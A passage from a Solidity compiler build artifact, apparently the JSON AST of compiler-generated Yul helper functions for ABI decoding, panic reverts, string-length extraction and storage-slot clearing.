Type":"YulIdentifier","src":"1105:6:14"}]}]}]},"name":"abi_decode_tuple_t_address_fromMemory","nativeSrc":"845:351:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"headStart","nativeSrc":"892:9:14","nodeType":"YulTypedName","src":"892:9:14","type":""},{"name":"dataEnd","nativeSrc":"903:7:14","nodeType":"YulTypedName","src":"903:7:14","type":""}],"returnVariables":[{"name":"value0","nativeSrc":"915:6:14","nodeType":"YulTypedName","src":"915:6:14","type":""}],"src":"845:351:14"},{"body":{"nativeSrc":"1261:40:14","nodeType":"YulBlock","src":"1261:40:14","statements":[{"nativeSrc":"1272:22:14","nodeType":"YulAssignment","src":"1272:22:14","value":{"arguments":[{"name":"value","nativeSrc":"1288:5:14","nodeType":"YulIdentifier","src":"1288:5:14"}],"functionName":{"name":"mload","nativeSrc":"1282:5:14","nodeType":"YulIdentifier","src":"1282:5:14"},"nativeSrc":"1282:12:14","nodeType":"YulFunctionCall","src":"1282:12:14"},"variableNames":[{"name":"length","nativeSrc":"1272:6:14","nodeType":"YulIdentifier","src":"1272:6:14"}]}]},"name":"array_length_t_string_memory_ptr","nativeSrc":"1202:99:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"1244:5:14","nodeType":"YulTypedName","src":"1244:5:14","type":""}],"returnVariables":[{"name":"length","nativeSrc":"1254:6:14","nodeType":"YulTypedName","src":"1254:6:14","type":""}],"src":"1202:99:14"},{"body":{"nativeSrc":"1335:152:14","nodeType":"YulBlock","src":"1335:152:14","statements":[{"expression":{"arguments":[{"kind":"number","nativeSrc":"1352:1:14","nodeType":"YulLiteral","src":"1352:1:14","type":"","value":"0"},{"kind":"number","nativeSrc":"1355:77:14","nodeType":"YulLiteral","src":"1355:77:14","type":"","value":"35408467139433450592217433187231851964531694900788300625387963629091585785856"}],"functionName":{"name":"mstore","nativeSrc":"1345:6:14","nodeType":"YulIdentifier","src":"1345:6:14"},"nativeSrc":"1345:88:14","nodeType":"YulFunctionCall","src":"1345:88:14"},"nativeSrc":"1345:88:14","nodeType":"YulExpressionStatement","src":"1345:88:14"},{"expression":{"arguments":[{"kind":"number","nativeSrc":"1449:1:14","nodeType":"YulLiteral","src":"1449:1:14","type":"","value":"4"},{"kind":"number","nativeSrc":"1452:4:14","nodeType":"YulLiteral","src":"1452:4:14","type":"","value":"0x41"}],"functionName":{"name":"mstore","nativeSrc":"1442:6:14","nodeType":"YulIdentifier","src":"1442:6:14"},"nativeSrc":"1442:15:14","nodeType":"YulFunctionCall","src":"1442:15:14"},"nativeSrc":"1442:15:14","nodeType":"YulExpressionStatement","src":"1442:15:14"},{"expression":{"arguments":[{"kind":"number","nativeSrc":"1473:1:14","nodeType":"YulLiteral","src":"1473:1:14","type":"","value":"0"},{"kind":"number","nativeSrc":"1476:4:14","nodeType":"YulLiteral","src":"1476:4:14","type":"","value":"0x24"}],"functionName":{"name":"revert","nativeSrc":"1466:6:14","nodeType":"YulIdentifier","src":"1466:6:14"},"nativeSrc":"1466:15:14","nodeType":"YulFunctionCall","src":"1466:15:14"},"nativeSrc":"1466:15:14","nodeType":"YulExpressionStatement","src":"1466:15:14"}]},"name":"panic_error_0x41","nativeSrc":"1307:180:14","nodeType":"YulFunctionDefinition","src":"1307:180:14"},{"body":{"nativeSrc":"1521:152:14","nodeType":"YulBlock","src":"1521:152:14","statements":[{"expression":{"arguments":[{"kind":"number","nativeSrc":"1538:1:14","nodeType":"YulLiteral","src":"1538:1:14","type":"","value":"0"},{"kind":"number","nativeSrc":"1541:77:14","nodeType":"YulLiteral","src":"1541:77:14","type":"","value":"35408467139433450592217433187231851964531694900788300625387963629091585785856"}],"functionName":{"name":"mstore","nativeSrc":"1531:6:14","nodeType":"YulIdentifier","src":"1531:6:14"},"nativeSrc":"1531:88:14","nodeType":"YulFunctionCall","src":"1531:88:14"},"nativeSrc":"1531:88:14","nodeType":"YulExpressionStatement","src":"1531:88:14"},{"expression":{"arguments":[{"kind":"number","nativeSrc":"1635:1:14","nodeType":"YulLiteral","src":"1635:1:14","type":"","value":"4"},{"kind":"number","nativeSrc":"1638:4:14","nodeType":"YulLiteral","src":"1638:4:14","type":"","value":"0x22"}],"functionName":{"name":"mstore","nativeSrc":"1628:6:14","nodeType":"YulIdentifier","src":"1628:6:14"},"nativeSrc":"1628:15:14","nodeType":"YulFunctionCall","src":"1628:15:14"},"nativeSrc":"1628:15:14","nodeType":"YulExpressionStatement","src":"1628:15:14"},{"expression":{"arguments":[{"kind":"number","nativeSrc":"1659:1:14","nodeType":"YulLiteral","src":"1659:1:14","type":"","value":"0"},{"kind":"number","nativeSrc":"1662:4:14","nodeType":"YulLiteral","src":"1662:4:14","type":"","value":"0x24"}],"functionName":{"name":"revert","nativeSrc":"1652:6:14","nodeType":"YulIdentifier","src":"1652:6:14"},"nativeSrc":"1652:15:14","nodeType":"YulFunctionCall","src":"1652:15:14"},"nativeSrc":"1652:15:14","nodeType":"YulExpressionStatement","src":"1652:15:14"}]},"name":"panic_error_0x22","nativeSrc":"1493:180:14","nodeType":"YulFunctionDefinition","src":"1493:180:14"},{"body":{"nativeSrc":"1730:269:14","nodeType":"YulBlock","src":"1730:269:14","statements":[{"nativeSrc":"1740:22:14","nodeType":"YulAssignment","src":"1740:22:14","value":{"arguments":[{"name":"data","nativeSrc":"1754:4:14","nodeType":"YulIdentifier","src":"1754:4:14"},{"kind":"number","nativeSrc":"1760:1:14","nodeType":"YulLiteral","src":"1760:1:14","type":"","value":"2"}],"functionName":{"name":"div","nativeSrc":"1750:3:14","nodeType":"YulIdentifier","src":"1750:3:14"},"nativeSrc":"1750:12:14","nodeType":"YulFunctionCall","src":"1750:12:14"},"variableNames":[{"name":"length","nativeSrc":"1740:6:14","nodeType":"YulIdentifier","src":"1740:6:14"}]},{"nativeSrc":"1771:38:14","nodeType":"YulVariableDeclaration","src":"1771:38:14","value":{"arguments":[{"name":"data","nativeSrc":"1801:4:14","nodeType":"YulIdentifier","src":"1801:4:14"},{"kind":"number","nativeSrc":"1807:1:14","nodeType":"YulLiteral","src":"1807:1:14","type":"","value":"1"}],"functionName":{"name":"and","nativeSrc":"1797:3:14","nodeType":"YulIdentifier","src":"1797:3:14"},"nativeSrc":"1797:12:14","nodeType":"YulFunctionCall","src":"1797:12:14"},"variables":[{"name":"outOfPlaceEncoding","nativeSrc":"1775:18:14","nodeType":"YulTypedName","src":"1775:18:14","type":""}]},{"body":{"nativeSrc":"1848:51:14","nodeType":"YulBlock","src":"1848:51:14","statements":[{"nativeSrc":"1862:27:14","nodeType":"YulAssignment","src":"1862:27:14","value":{"arguments":[{"name":"length","nativeSrc":"1876:6:14","nodeType":"YulIdentifier","src":"1876:6:14"},{"kind":"number","nativeSrc":"1884:4:14","nodeType":"YulLiteral","src":"1884:4:14","type":"","value":"0x7f"}],"functionName":{"name":"and","nativeSrc":"1872:3:14","nodeType":"YulIdentifier","src":"1872:3:14"},"nativeSrc":"1872:17:14","nodeType":"YulFunctionCall","src":"1872:17:14"},"variableNames":[{"name":"length","nativeSrc":"1862:6:14","nodeType":"YulIdentifier","src":"1862:6:14"}]}]},"condition":{"arguments":[{"name":"outOfPlaceEncoding","nativeSrc":"1828:18:14","nodeType":"YulIdentifier","src":"1828:18:14"}],"functionName":{"name":"iszero","nativeSrc":"1821:6:14","nodeType":"YulIdentifier","src":"1821:6:14"},"nativeSrc":"1821:26:14","nodeType":"YulFunctionCall","src":"1821:26:14"},"nativeSrc":"1818:81:14","nodeType":"YulIf","src":"1818:81:14"},{"body":{"nativeSrc":"1951:42:14","nodeType":"YulBlock","src":"1951:42:14","statements":[{"expression":{"arguments":[],"functionName":{"name":"panic_error_0x22","nativeSrc":"1965:16:14","nodeType":"YulIdentifier","src":"1965:16:14"},"nativeSrc":"1965:18:14","nodeType":"YulFunctionCall","src":"1965:18:14"},"nativeSrc":"1965:18:14","nodeType":"YulExpressionStatement","src":"1965:18:14"}]},"condition":{"arguments":[{"name":"outOfPlaceEncoding","nativeSrc":"1915:18:14","nodeType":"YulIdentifier","src":"1915:18:14"},{"arguments":[{"name":"length","nativeSrc":"1938:6:14","nodeType":"YulIdentifier","src":"1938:6:14"},{"kind":"number","nativeSrc":"1946:2:14","nodeType":"YulLiteral","src":"1946:2:14","type":"","value":"32"}],"functionName":{"name":"lt","nativeSrc":"1935:2:14","nodeType":"YulIdentifier","src":"1935:2:14"},"nativeSrc":"1935:14:14","nodeType":"YulFunctionCall","src":"1935:14:14"}],"functionName":{"name":"eq","nativeSrc":"1912:2:14","nodeType":"YulIdentifier","src":"1912:2:14"},"nativeSrc":"1912:38:14","nodeType":"YulFunctionCall","src":"1912:38:14"},"nativeSrc":"1909:84:14","nodeType":"YulIf","src":"1909:84:14"}]},"name":"extract_byte_array_length","nativeSrc":"1679:320:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"data","nativeSrc":"1714:4:14","nodeType":"YulTypedName","src":"1714:4:14","type":""}],"returnVariables":[{"name":"length","nativeSrc":"1723:6:14","nodeType":"YulTypedName","src":"1723:6:14","type":""}],"src":"1679:320:14"},{"body":{"nativeSrc":"2059:87:14","nodeType":"YulBlock","src":"2059:87:14","statements":[{"nativeSrc":"2069:11:14","nodeType":"YulAssignment","src":"2069:11:14","value":{"name":"ptr","nativeSrc":"2077:3:14","nodeType":"YulIdentifier","src":"2077:3:14"},"variableNames":[{"name":"data","nativeSrc":"2069:4:14","nodeType":"YulIdentifier","src":"2069:4:14"}]},{"expression":{"arguments":[{"kind":"number","nativeSrc":"2097:1:14","nodeType":"YulLiteral","src":"2097:1:14","type":"","value":"0"},{"name":"ptr","nativeSrc":"2100:3:14","nodeType":"YulIdentifier","src":"2100:3:14"}],"functionName":{"name":"mstore","nativeSrc":"2090:6:14","nodeType":"YulIdentifier","src":"2090:6:14"},"nativeSrc":"2090:14:14","nodeType":"YulFunctionCall","src":"2090:14:14"},"nativeSrc":"2090:14:14","nodeType":"YulExpressionStatement","src":"2090:14:14"},{"nativeSrc":"2113:26:14","nodeType":"YulAssignment","src":"2113:26:14","value":{"arguments":[{"kind":"number","nativeSrc":"2131:1:14","nodeType":"YulLiteral","src":"2131:1:14","type":"","value":"0"},{"kind":"number","nativeSrc":"2134:4:14","nodeType":"YulLiteral","src":"2134:4:14","type":"","value":"0x20"}],"functionName":{"name":"keccak256","nativeSrc":"2121:9:14","nodeType":"YulIdentifier","src":"2121:9:14"},"nativeSrc":"2121:18:14","nodeType":"YulFunctionCall","src":"2121:18:14"},"variableNames":[{"name":"data","nativeSrc":"2113:4:14","nodeType":"YulIdentifier","src":"2113:4:14"}]}]},"name":"array_dataslot_t_string_storage","nativeSrc":"2005:141:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"ptr","nativeSrc":"2046:3:14","nodeType":"YulTypedName","src":"2046:3:14","type":""}],"returnVariables":[{"name":"data","nativeSrc":"2054:4:14","nodeType":"YulTypedName","src":"2054:4:14","type":""}],"src":"2005:141:14"},{"body":{"nativeSrc":"2196:49:14","nodeType":"YulBlock","src":"2196:49:14","statements":[{"nativeSrc":"2206:33:14","nodeType":"YulAssignment","src":"2206:33:14","value":{"arguments":[{"arguments":[{"name":"value","nativeSrc":"2224:5:14","nodeType":"YulIdentifier","src":"2224:5:14"},{"kind":"number","nativeSrc":"2231:2:14","nodeType":"YulLiteral","src":"2231:2:14","type":"","value":"31"}],"functionName":{"name":"add","nativeSrc":"2220:3:14","nodeType":"YulIdentifier","src":"2220:3:14"},"nativeSrc":"2220:14:14","nodeType":"YulFunctionCall","src":"2220:14:14"},{"kind":"number","nativeSrc":"2236:2:14","nodeType":"YulLiteral","src":"2236:2:14","type":"","value":"32"}],"functionName":{"name":"div","nativeSrc":"2216:3:14","nodeType":"YulIdentifier","src":"2216:3:14"},"nativeSrc":"2216:23:14","nodeType":"YulFunctionCall","src":"2216:23:14"},"variableNames":[{"name":"result","nativeSrc":"2206:6:14","nodeType":"YulIdentifier","src":"2206:6:14"}]}]},"name":"divide_by_32_ceil","nativeSrc":"2152:93:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"2179:5:14","nodeType":"YulTypedName","src":"2179:5:14","type":""}],"returnVariables":[{"name":"result","nativeSrc":"2189:6:14","nodeType":"YulTypedName","src":"2189:6:14","type":""}],"src":"2152:93:14"},{"body":{"nativeSrc":"2304:54:14","nodeType":"YulBlock","src":"2304:54:14","statements":[{"nativeSrc":"2314:37:14","nodeType":"YulAssignment","src":"2314:37:14","value":{"arguments":[{"name":"bits","nativeSrc":"2339:4:14","nodeType":"YulIdentifier","src":"2339:4:14"},{"name":"value","nativeSrc":"2345:5:14","nodeType":"YulIdentifier","src":"2345:5:14"}],"functionName":{"name":"shl","nativeSrc":"2335:3:14","nodeType":"YulIdentifier","src":"2335:3:14"},"nativeSrc":"2335:16:14","nodeType":"YulFunctionCall","src":"2335:16:14"},"variableNames":[{"name":"newValue","nativeSrc":"2314:8:14","nodeType":"YulIdentifier","src":"2314:8:14"}]}]},"name":"shift_left_dynamic","nativeSrc":"2251:107:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"bits","nativeSrc":"2279:4:14","nodeType":"YulTypedName","src":"2279:4:14","type":""},{"name":"value","nativeSrc":"2285:5:14","nodeType":"YulTypedName","src":"2285:5:14","type":""}],"returnVariables":[{"name":"newValue","nativeSrc":"2295:8:14","nodeType":"YulTypedName","src":"2295:8:14","type":""}],"src":"2251:107:14"},{"body":{"nativeSrc":"2440:317:14","nodeType":"YulBlock","src":"2440:317:14","statements":[{"nativeSrc":"2450:35:14","nodeType":"YulVariableDeclaration","src":"2450:35:14","value":{"arguments":[{"name":"shiftBytes","nativeSrc":"2471:10:14","nodeType":"YulIdentifier","src":"2471:10:14"},{"kind":"number","nativeSrc":"2483:1:14","nodeType":"YulLiteral","src":"2483:1:14","type":"","value":"8"}],"functionName":{"name":"mul","nativeSrc":"2467:3:14","nodeType":"YulIdentifier","src":"2467:3:14"},"nativeSrc":"2467:18:14","nodeType":"YulFunctionCall","src":"2467:18:14"},"variables":[{"name":"shiftBits","nativeSrc":"2454:9:14","nodeType":"YulTypedName","src":"2454:9:14","type":""}]},{"nativeSrc":"2494:109:14","nodeType":"YulVariableDeclaration","src":"2494:109:14","value":{"arguments":[{"name":"shiftBits","nativeSrc":"2525:9:14","nodeType":"YulIdentifier","src":"2525:9:14"},{"kind":"number","nativeSrc":"2536:66:14","nodeType":"YulLiteral","src":"2536:66:14","type":"","value":"0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"}],"functionName":{"name":"shift_left_dynamic","nativeSrc":"2506:18:14","nodeType":"YulIdentifier","src":"2506:18:14"},"nativeSrc":"2506:97:14","nodeType":"YulFunctionCall","src":"2506:97:14"},"variables":[{"name":"mask","nativeSrc":"2498:4:14","nodeType":"YulTypedName","src":"2498:4:14","type":""}]},{"nativeSrc":"2612:51:14","nodeType":"YulAssignment","src":"2612:51:14","value":{"arguments":[{"name":"shiftBits","nativeSrc":"2643:9:14","nodeType":"YulIdentifier","src":"2643:9:14"},{"name":"toInsert","nativeSrc":"2654:8:14","nodeType":"YulIdentifier","src":"2654:8:14"}],"functionName":{"name":"shift_left_dynamic","nativeSrc":"2624:18:14","nodeType":"YulIdentifier","src":"2624:18:14"},"nativeSrc":"2624:39:14","nodeType":"YulFunctionCall","src":"2624:39:14"},"variableNames":[{"name":"toInsert","nativeSrc":"2612:8:14","nodeType":"YulIdentifier","src":"2612:8:14"}]},{"nativeSrc":"2672:30:14","nodeType":"YulAssignment","src":"2672:30:14","value":{"arguments":[{"name":"value","nativeSrc":"2685:5:14","nodeType":"YulIdentifier","src":"2685:5:14"},{"arguments":[{"name":"mask","nativeSrc":"2696:4:14","nodeType":"YulIdentifier","src":"2696:4:14"}],"functionName":{"name":"not","nativeSrc":"2692:3:14","nodeType":"YulIdentifier","src":"2692:3:14"},"nativeSrc":"2692:9:14","nodeType":"YulFunctionCall","src":"2692:9:14"}],"functionName":{"name":"and","nativeSrc":"2681:3:14","nodeType":"YulIdentifier","src":"2681:3:14"},"nativeSrc":"2681:21:14","nodeType":"YulFunctionCall","src":"2681:21:14"},"variableNames":[{"name":"value","nativeSrc":"2672:5:14","nodeType":"YulIdentifier","src":"2672:5:14"}]},{"nativeSrc":"2711:40:14","nodeType":"YulAssignment","src":"2711:40:14","value":{"arguments":[{"name":"value","nativeSrc":"2724:5:14","nodeType":"YulIdentifier","src":"2724:5:14"},{"arguments":[{"name":"toInsert","nativeSrc":"2735:8:14","nodeType":"YulIdentifier","src":"2735:8:14"},{"name":"mask","nativeSrc":"2745:4:14","nodeType":"YulIdentifier","src":"2745:4:14"}],"functionName":{"name":"and","nativeSrc":"2731:3:14","nodeType":"YulIdentifier","src":"2731:3:14"},"nativeSrc":"2731:19:14","nodeType":"YulFunctionCall","src":"2731:19:14"}],"functionName":{"name":"or","nativeSrc":"2721:2:14","nodeType":"YulIdentifier","src":"2721:2:14"},"nativeSrc":"2721:30:14","nodeType":"YulFunctionCall","src":"2721:30:14"},"variableNames":[{"name":"result","nativeSrc":"2711:6:14","nodeType":"YulIdentifier","src":"2711:6:14"}]}]},"name":"update_byte_slice_dynamic32","nativeSrc":"2364:393:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"2401:5:14","nodeType":"YulTypedName","src":"2401:5:14","type":""},{"name":"shiftBytes","nativeSrc":"2408:10:14","nodeType":"YulTypedName","src":"2408:10:14","type":""},{"name":"toInsert","nativeSrc":"2420:8:14","nodeType":"YulTypedName","src":"2420:8:14","type":""}],"returnVariables":[{"name":"result","nativeSrc":"2433:6:14","nodeType":"YulTypedName","src":"2433:6:14","type":""}],"src":"2364:393:14"},{"body":{"nativeSrc":"2808:32:14","nodeType":"YulBlock","src":"2808:32:14","statements":[{"nativeSrc":"2818:16:14","nodeType":"YulAssignment","src":"2818:16:14","value":{"name":"value","nativeSrc":"2829:5:14","nodeType":"YulIdentifier","src":"2829:5:14"},"variableNames":[{"name":"cleaned","nativeSrc":"2818:7:14","nodeType":"YulIdentifier","src":"2818:7:14"}]}]},"name":"cleanup_t_uint256","nativeSrc":"2763:77:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"2790:5:14","nodeType":"YulTypedName","src":"2790:5:14","type":""}],"returnVariables":[{"name":"cleaned","nativeSrc":"2800:7:14","nodeType":"YulTypedName","src":"2800:7:14","type":""}],"src":"2763:77:14"},{"body":{"nativeSrc":"2878:28:14","nodeType":"YulBlock","src":"2878:28:14","statements":[{"nativeSrc":"2888:12:14","nodeType":"YulAssignment","src":"2888:12:14","value":{"name":"value","nativeSrc":"2895:5:14","nodeType":"YulIdentifier","src":"2895:5:14"},"variableNames":[{"name":"ret","nativeSrc":"2888:3:14","nodeType":"YulIdentifier","src":"2888:3:14"}]}]},"name":"identity","nativeSrc":"2846:60:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"2864:5:14","nodeType":"YulTypedName","src":"2864:5:14","type":""}],"returnVariables":[{"name":"ret","nativeSrc":"2874:3:14","nodeType":"YulTypedName","src":"2874:3:14","type":""}],"src":"2846:60:14"},{"body":{"nativeSrc":"2972:82:14","nodeType":"YulBlock","src":"2972:82:14","statements":[{"nativeSrc":"2982:66:14","nodeType":"YulAssignment","src":"2982:66:14","value":{"arguments":[{"arguments":[{"arguments":[{"name":"value","nativeSrc":"3040:5:14","nodeType":"YulIdentifier","src":"3040:5:14"}],"functionName":{"name":"cleanup_t_uint256","nativeSrc":"3022:17:14","nodeType":"YulIdentifier","src":"3022:17:14"},"nativeSrc":"3022:24:14","nodeType":"YulFunctionCall","src":"3022:24:14"}],"functionName":{"name":"identity","nativeSrc":"3013:8:14","nodeType":"YulIdentifier","src":"3013:8:14"},"nativeSrc":"3013:34:14","nodeType":"YulFunctionCall","src":"3013:34:14"}],"functionName":{"name":"cleanup_t_uint256","nativeSrc":"2995:17:14","nodeType":"YulIdentifier","src":"2995:17:14"},"nativeSrc":"2995:53:14","nodeType":"YulFunctionCall","src":"2995:53:14"},"variableNames":[{"name":"converted","nativeSrc":"2982:9:14","nodeType":"YulIdentifier","src":"2982:9:14"}]}]},"name":"convert_t_uint256_to_t_uint256","nativeSrc":"2912:142:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"2952:5:14","nodeType":"YulTypedName","src":"2952:5:14","type":""}],"returnVariables":[{"name":"converted","nativeSrc":"2962:9:14","nodeType":"YulTypedName","src":"2962:9:14","type":""}],"src":"2912:142:14"},{"body":{"nativeSrc":"3107:28:14","nodeType":"YulBlock","src":"3107:28:14","statements":[{"nativeSrc":"3117:12:14","nodeType":"YulAssignment","src":"3117:12:14","value":{"name":"value","nativeSrc":"3124:5:14","nodeType":"YulIdentifier","src":"3124:5:14"},"variableNames":[{"name":"ret","nativeSrc":"3117:3:14","nodeType":"YulIdentifier","src":"3117:3:14"}]}]},"name":"prepare_store_t_uint256","nativeSrc":"3060:75:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"value","nativeSrc":"3093:5:14","nodeType":"YulTypedName","src":"3093:5:14","type":""}],"returnVariables":[{"name":"ret","nativeSrc":"3103:3:14","nodeType":"YulTypedName","src":"3103:3:14","type":""}],"src":"3060:75:14"},{"body":{"nativeSrc":"3217:193:14","nodeType":"YulBlock","src":"3217:193:14","statements":[{"nativeSrc":"3227:63:14","nodeType":"YulVariableDeclaration","src":"3227:63:14","value":{"arguments":[{"name":"value_0","nativeSrc":"3282:7:14","nodeType":"YulIdentifier","src":"3282:7:14"}],"functionName":{"name":"convert_t_uint256_to_t_uint256","nativeSrc":"3251:30:14","nodeType":"YulIdentifier","src":"3251:30:14"},"nativeSrc":"3251:39:14","nodeType":"YulFunctionCall","src":"3251:39:14"},"variables":[{"name":"convertedValue_0","nativeSrc":"3231:16:14","nodeType":"YulTypedName","src":"3231:16:14","type":""}]},{"expression":{"arguments":[{"name":"slot","nativeSrc":"3306:4:14","nodeType":"YulIdentifier","src":"3306:4:14"},{"arguments":[{"arguments":[{"name":"slot","nativeSrc":"3346:4:14","nodeType":"YulIdentifier","src":"3346:4:14"}],"functionName":{"name":"sload","nativeSrc":"3340:5:14","nodeType":"YulIdentifier","src":"3340:5:14"},"nativeSrc":"3340:11:14","nodeType":"YulFunctionCall","src":"3340:11:14"},{"name":"offset","nativeSrc":"3353:6:14","nodeType":"YulIdentifier","src":"3353:6:14"},{"arguments":[{"name":"convertedValue_0","nativeSrc":"3385:16:14","nodeType":"YulIdentifier","src":"3385:16:14"}],"functionName":{"name":"prepare_store_t_uint256","nativeSrc":"3361:23:14","nodeType":"YulIdentifier","src":"3361:23:14"},"nativeSrc":"3361:41:14","nodeType":"YulFunctionCall","src":"3361:41:14"}],"functionName":{"name":"update_byte_slice_dynamic32","nativeSrc":"3312:27:14","nodeType":"YulIdentifier","src":"3312:27:14"},"nativeSrc":"3312:91:14","nodeType":"YulFunctionCall","src":"3312:91:14"}],"functionName":{"name":"sstore","nativeSrc":"3299:6:14","nodeType":"YulIdentifier","src":"3299:6:14"},"nativeSrc":"3299:105:14","nodeType":"YulFunctionCall","src":"3299:105:14"},"nativeSrc":"3299:105:14","nodeType":"YulExpressionStatement","src":"3299:105:14"}]},"name":"update_storage_value_t_uint256_to_t_uint256","nativeSrc":"3141:269:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"slot","nativeSrc":"3194:4:14","nodeType":"YulTypedName","src":"3194:4:14","type":""},{"name":"offset","nativeSrc":"3200:6:14","nodeType":"YulTypedName","src":"3200:6:14","type":""},{"name":"value_0","nativeSrc":"3208:7:14","nodeType":"YulTypedName","src":"3208:7:14","type":""}],"src":"3141:269:14"},{"body":{"nativeSrc":"3465:24:14","nodeType":"YulBlock","src":"3465:24:14","statements":[{"nativeSrc":"3475:8:14","nodeType":"YulAssignment","src":"3475:8:14","value":{"kind":"number","nativeSrc":"3482:1:14","nodeType":"YulLiteral","src":"3482:1:14","type":"","value":"0"},"variableNames":[{"name":"ret","nativeSrc":"3475:3:14","nodeType":"YulIdentifier","src":"3475:3:14"}]}]},"name":"zero_value_for_split_t_uint256","nativeSrc":"3416:73:14","nodeType":"YulFunctionDefinition","returnVariables":[{"name":"ret","nativeSrc":"3461:3:14","nodeType":"YulTypedName","src":"3461:3:14","type":""}],"src":"3416:73:14"},{"body":{"nativeSrc":"3548:136:14","nodeType":"YulBlock","src":"3548:136:14","statements":[{"nativeSrc":"3558:46:14","nodeType":"YulVariableDeclaration","src":"3558:46:14","value":{"arguments":[],"functionName":{"name":"zero_value_for_split_t_uint256","nativeSrc":"3572:30:14","nodeType":"YulIdentifier","src":"3572:30:14"},"nativeSrc":"3572:32:14","nodeType":"YulFunctionCall","src":"3572:32:14"},"variables":[{"name":"zero_0","nativeSrc":"3562:6:14","nodeType":"YulTypedName","src":"3562:6:14","type":""}]},{"expression":{"arguments":[{"name":"slot","nativeSrc":"3657:4:14","nodeType":"YulIdentifier","src":"3657:4:14"},{"name":"offset","nativeSrc":"3663:6:14","nodeType":"YulIdentifier","src":"3663:6:14"},{"name":"zero_0","nativeSrc":"3671:6:14","nodeType":"YulIdentifier","src":"3671:6:14"}],"functionName":{"name":"update_storage_value_t_uint256_to_t_uint256","nativeSrc":"3613:43:14","nodeType":"YulIdentifier","src":"3613:43:14"},"nativeSrc":"3613:65:14","nodeType":"YulFunctionCall","src":"3613:65:14"},"nativeSrc":"3613:65:14","nodeType":"YulExpressionStatement","src":"3613:65:14"}]},"name":"storage_set_to_zero_t_uint256","nativeSrc":"3495:189:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"slot","nativeSrc":"3534:4:14","nodeType":"YulTypedName","src":"3534:4:14","type":""},{"name":"offset","nativeSrc":"3540:6:14","nodeType":"YulTypedName","src":"3540:6:14","type":""}],"src":"3495:189:14"},{"body":{"nativeSrc":"3740:136:14","nodeType":"YulBlock","src":"3740:136:14","statements":[{"body":{"nativeSrc":"3807:63:14","nodeType":"YulBlock","src":"3807:63:14","statements":[{"expression":{"arguments":[{"name":"start","nativeSrc":"3851:5:14","nodeType":"YulIdentifier","src":"3851:5:14"},{"kind":"number","nativeSrc":"3858:1:14","nodeType":"YulLiteral","src":"3858:1:14","type":"","value":"0"}],"functionName":{"name":"storage_set_to_zero_t_uint256","nativeSrc":"3821:29:14","nodeType":"YulIdentifier","src":"3821:29:14"},"nativeSrc":"3821:39:14","nodeType":"YulFunctionCall","src":"3821:39:14"},"nativeSrc":"3821:39:14","nodeType":"YulExpressionStatement","src":"3821:39:14"}]},"condition":{"arguments":[{"name":"start","nativeSrc":"3760:5:14","nodeType":"YulIdentifier","src":"3760:5:14"},{"name":"end","nativeSrc":"3767:3:14","nodeType":"YulIdentifier","src":"3767:3:14"}],"functionName":{"name":"lt","nativeSrc":"3757:2:14","nodeType":"YulIdentifier","src":"3757:2:14"},"nativeSrc":"3757:14:14","nodeType":"YulFunctionCall","src":"3757:14:14"},"nativeSrc":"3750:120:14","nodeType":"YulForLoop","post":{"nativeSrc":"3772:26:14","nodeType":"YulBlock","src":"3772:26:14","statements":[{"nativeSrc":"3774:22:14","nodeType":"YulAssignment","src":"3774:22:14","value":{"arguments":[{"name":"start","nativeSrc":"3787:5:14","nodeType":"YulIdentifier","src":"3787:5:14"},{"kind":"number","nativeSrc":"3794:1:14","nodeType":"YulLiteral","src":"3794:1:14","type":"","value":"1"}],"functionName":{"name":"add","nativeSrc":"3783:3:14","nodeType":"YulIdentifier","src":"3783:3:14"},"nativeSrc":"3783:13:14","nodeType":"YulFunctionCall","src":"3783:13:14"},"variableNames":[{"name":"start","nativeSrc":"3774:5:14","nodeType":"YulIdentifier","src":"3774:5:14"}]}]},"pre":{"nativeSrc":"3754:2:14","nodeType":"YulBlock","src":"3754:2:14","statements":[]},"src":"3750:120:14"}]},"name":"clear_storage_range_t_bytes1","nativeSrc":"3690:186:14","nodeType":"YulFunctionDefinition","parameters":[{"name":"start","nativeSrc":"3728:5:14","nodeType":"YulTypedName","src":"3728:5:14","type":""},{"name":"end","nativeSrc":"3735:3:14","nodeType":"YulTypedName","src":"3735:3:14","type":""}],"src":"3690:186:14"},{"body":{"nativeSrc":"3961:464:14","nodeType":"YulBlock","src":"3961:464:14","statements":[{"body":{"nativeSrc":"3987:431:14","nodeType":"YulBlock","src":"3987:431:14","statements":[{"nativeSrc":"4001:54:14","nodeType":"YulVariableDeclaration","src":"4001:54:14","value":{"arguments":[{"name":"array","nativeSrc":"4049:5:14","nodeType":"YulIdentifier","src":"4049:5:14"}],"functionName":{"name":"array_dataslot_t_string_storage","nativeSrc":"4017:31:14","nodeType":"YulIdentifier","src":"4017:31:14"},"nativeSrc":"4017:38:14","nodeType":"YulFunctionCall","src":"4017:38:14"},"variables":[{"name":"dataArea","nativeSrc":"4005:8:14","nodeType":"YulTypedName","src":"4005:8:14","type":""}]},{"nativeSrc":"4068:63:14","nodeType":"YulVariableDeclaration","src":"4068:63:14","value":{"arguments":[{"name":"dataArea","nativeSrc":"4091:8:14","nodeType":"YulIdentifier","src":"4091:8:14"},{"arguments":[{"name":"startIndex","nativeSrc":"4119:10:14","nodeType":"YulIdentifier","src":"4119:10:14"}],"functionName":{"name":"divide_by_32_ceil","nativeSrc":"4101:17:14","nodeType":"YulIdentifier","src":"4101:17:14"},"nativeSrc":"4101:29:14","nodeType":"YulFunctionCall","src":"4101:29:14"}],"functionName":{"name":"add","nativeSrc":"4087:3:14","nodeType":"YulIdentifier","src":"4087:3:14"},"nativeSrc":"4087:44:14","nodeType":"YulFunctionCall","src":"4087:44:14"},"variables":[{"name":"deleteStart","nativeSrc":"4072:11:14","nodeType":"YulTypedName","src":"4072:11:14"